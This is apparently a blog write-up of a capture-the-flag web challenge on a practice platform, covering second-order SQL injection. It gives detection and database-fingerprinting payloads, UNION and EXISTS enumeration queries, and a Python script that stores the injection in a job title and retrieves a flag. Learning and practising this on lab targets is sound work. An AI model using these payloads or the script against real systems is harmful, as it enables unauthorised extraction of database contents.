 ---
title: "Second Order SQLi"
date: 2026-01-31 00:00:00 +0530
categories: [Web Exploitation]
tags: [second oder sqli]
platform: Web
author: 0xmr
image: /assets/img/posts/sqli.webp
---

# Second Oder SQLi
- Second-Order SQL injection occurs when the application takes user input from an HTTP request and stores it for future use. 
- This is done by placing the input into a database, but no vuln occurs at the point when the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporated it into a SQL query in an unsafe way.

## Detect sqli 
```bash
'       (single quote)
"       (double quote)
`       (backtick)
;       (semicolon)
--      (SQL comment)
#       (MySQL comment)
/* */   (multi-line comment)
```

### Detection Database
```bash
- MySQL:   'or(SELECT 1 FROM information_schema.tables)--
- PostgreSQL:   'or(SELECT 1 FROM pg_database)--
- MSSQL:   'or(SELECT 1 FROM sys.databases)--
- sqlite   'or(SELECT 1 FROM sqlite_master)--
```

## Find Number of columns
```bash
test' union select 1-- -
test' union select 1,2-- -
test' union select 1,2,n-- -    # for n times until you get return true (true = means no error occurs)
```

# Example
This example i am taking from the [bugforge.io](https://app.bugforge.io/) platform FurHire weekly challenge.
### Steps of Exploitation:-
- Step 1:- Identify second order sqli in Job tittle.
- Step 2:- Test sqli with `' or 1=1-- -`
- Step 3:- Detect database.
- Step 4:- `sqlite` database detected, know let's search table name with `EXISTS`.


```bash
# If the table exists this statment will return TRUE and viceversa

'or exists(select 1 from sqlite_master where type='table' and name='PUT_Table_Name_here')--

some common table name:-
users
user
config
user_account 
auth_user 
user_login_data 
account 
usrloginfo
```

- Step 5:- config and user table detection know let's fetch flag from columns.
- Step 6:- fetch columns name with contains flag string 

```bash
'or exists(select 1 from sqlite_master where name='config' and sql LIKE '%flag%')--
```

**Checks:** Does the `config` table have a column named **"flag"** (or containing "flag" in its name)?
**Returns:**

- **TRUE** → The `config` table exists AND has a column with "flag" in the name (like `flag`, `flags`, `secret_flag`, `api_flag`, etc.)
- **FALSE** → Either the table doesn't exist OR it has no column with "flag" in the name


- Step 7:- know let's check how any columns are there  payload= test' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- -
- Step 8:- fetching flag


```bash
' UNION SELECT * FROM (SELECT value FROM config WHERE key='flag') JOIN (SELECT 2) JOIN (SELECT 3) JOIN (SELECT 4) JOIN (SELECT 5) JOIN (SELECT 6) JOIN (SELECT 7) JOIN (SELECT 8) JOIN (SELECT 9) JOIN (SELECT 10) JOIN (SELECT 11) JOIN (SELECT 12) JOIN (SELECT 13) JOIN (SELECT 14) JOIN (SELECT 15)--
```

- Step 9:- Wrote a small python script for automation. This will create a job, grab the created job_id and send a reuquest to fetech flag from the id parameter with that job_id.


```bash

import requests

target_url = "target-url"
token = "Auth-token"
 
session = requests.Session()
session.headers.update({"Authorization": f"Bearer {token}", "Content-Type": "application/json"})

payload = "' UNION SELECT * FROM (SELECT value FROM config WHERE key='flag') JOIN (SELECT 2) JOIN (SELECT 3) JOIN (SELECT 4) JOIN (SELECT 5) JOIN (SELECT 6) JOIN (SELECT 7) JOIN (SELECT 8) JOIN (SELECT 9) JOIN (SELECT 10) JOIN (SELECT 11) JOIN (SELECT 12) JOIN (SELECT 13) JOIN (SELECT 14) JOIN (SELECT 15)--"

job = session.post(f"{target_url}/api/jobs", json={
    "title": payload,
    "description": "bugforge is best!",
    "location": "localhost",
    "job_type": "Full-time",
    "salary_range": "1",
    "requirements": ["Pentester"]
}).json()

job_id = job["id"]
print(f"[*] Job ID: {job_id}")

applicants = session.get(f"{target_url}/api/jobs/{job_id}/applicants").json()

if applicants:
    print(f"\n[+] FLAG: {applicants[0]['id']}")
else:
    print(f"[!] Try Next time bad luck bro, flag might be job ID: {job_id}")

```
